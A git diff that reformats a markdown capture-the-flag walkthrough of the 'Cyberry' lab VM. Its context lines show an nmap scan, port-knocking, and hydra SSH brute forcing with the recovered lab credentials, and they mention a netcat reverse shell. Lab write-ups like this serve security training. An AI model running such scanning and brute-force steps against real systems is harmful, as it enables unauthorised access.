@@ -22,6 +22,8 @@ Let's kick this off with a `nmap` scan to establish the services available in **
 
 ```
 # nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.128
+```
+```
 ...
 PORT    STATE  SERVICE REASON         VERSION
 21/tcp  open   ftp     syn-ack ttl 64 ProFTPD 1.3.5b
@@ -62,7 +64,7 @@ http://192.168.198.128/phpmyadmin (Status: 301)
 =====================================================
 ```
 
-### A fork bomb in `.bashrc`
+### Fork Bomb :bomb:
 
 There was something sinister lurking in `.bashrc`  
 
@@ -80,7 +82,9 @@ Decoding the above strings revealed the following.
 
 ```
 # curl -s 192.168.198.128 | sed -n '/<!--/,/-->/p' | tr -cd 'a-zA-Z0-9=\n' > base64.txt
-$ for b in $(cat base64.txt); do (echo $b | base64 -d && echo); done
+```
+```bash
+# for b in $(cat base64.txt); do (echo $b | base64 -d && echo); done
 nice try!
 nothing to see here!
 time to move on!
@@ -92,6 +96,8 @@ Requesting for `/secretfile.html` resulted in.
 
 ```
 # curl -i 192.168.198.128/secretfile.html
+```
+```
 HTTP/1.1 200 OK
 Date: Mon, 22 Jan 2018 15:09:17 GMT
 Server: Apache/2.4.25 (Debian)
@@ -131,6 +137,8 @@ Requesting for `/work-in-progress.png` resulted in.
 
 ```
 # curl -i 192.168.198.128/work-in-progress.png
+```
+```
 HTTP/1.1 200 OK
 Date: Mon, 22 Jan 2018 15:11:43 GMT
 Server: Apache/2.4.25 (Debian)
@@ -188,7 +196,7 @@ Dir found: /server-status/ - 403
 DirBuster Stopped
 ```
 
-### Login Page `/login.php`
+### Login Page
 
 The login page had a weakness - it leaked information about the existence of a user.
 
@@ -229,7 +237,7 @@ Elderberry was a hyperlink to an interesting file - `/placeho1der.jpg`:
 
 ![placeho1der.jpg](/assets/images/posts/cyberry-walkthrough/placeho1der.jpg)
 
-### Solving the puzzle of `/placeho1der.jpg`
+### Solving the Puzzle
 
 The image required some transformation before the puzzle can be revealed:
 
@@ -252,7 +260,7 @@ The common denominator that linked each person was the song "_I Hear You Knockin
 
 Port knocking required connecting to a sequence of ports in the correct order before certain port(s) are revealed. The year which the song was covered by each person makes it a good starting point to guess the correct port sequence.
 
-### Unlocking `61955/tcp`
+### Knock Knock :door:
 
 I wrote this port knocking script using `nmap`.
 
@@ -276,6 +284,8 @@ done
 
 ```bash
 # python -c 'import itertools; print list(itertools.permutations([1955,1955,1961,1970]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq
+```
+```
 1955,1955,1961,1970
 1955,1955,1970,1961
 1955,1961,1955,1970
@@ -331,6 +341,8 @@ Requesting for `http://192.168.198.128:61955/H` revealed something interesting.
 
 ```
 # curl 192.168.198.128:61955/H
+```
+```
 ++++++++++[>+++++++>++++++++++>+++>+<<<<-]>++.>+.+++++++..+++.>++.<<+++++++++++++++.>.+++.------.--------.>+.>.
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -439,7 +451,7 @@ done
 
 It certainly looked like some sort of password!
 
-### Login page `/login.php` (2)
+### Login Page (2)
 
 Recall from above the site has a login page to the Berrypedia Admin Panel? Well, this site has a login page as well.
 
@@ -467,7 +479,7 @@ Bingo! Using this way, I was able to run a reverse shell using `nc` back to me.
 
 Awesome.
 
-### Learning the `root` dance
+### Learning the `root` Dance
 
 During enumeration, I spotted an interesting file at `/var/www/html-secure/ub3r-s3cur3`
 
@@ -480,7 +492,7 @@ hydra -L members.txt -P nb-latin -f ssh://192.168.198.128
 [22][ssh] host: 192.168.198.128 login: nick password: custodio
 ```
 
-### Unstacking the `sudo` Russian doll
+### Unstacking the `sudo` Russian Doll
 
 I was able to SSH in to `nick`'s account using the credentials `(nick:custodio)` and here's where the crazy `sudo` Russian doll fun begins.
 
@@ -523,7 +535,7 @@ However, at the home directory of `chuck` there was still something interesting 
 
 The file at `/home/chuck/.deleted/deleted` provided hints to the `root` password!
 
-### Guessing the `root` password
+### Guessing the `root` Password
 
 Here's what we know about the `root` password.
 
@@ -592,7 +604,7 @@ One of the above got to be the `root` password. Using `hydra`, verifying the pas
 [22][ssh] host: 192.168.198.128 login: root password: chewbacabemerry
 ```
 
-### I know the `root` dance!
+### I Know the `root` Dance!
 
 ![root-dance.png](/assets/images/posts/cyberry-walkthrough/cyberry-18.png)
 
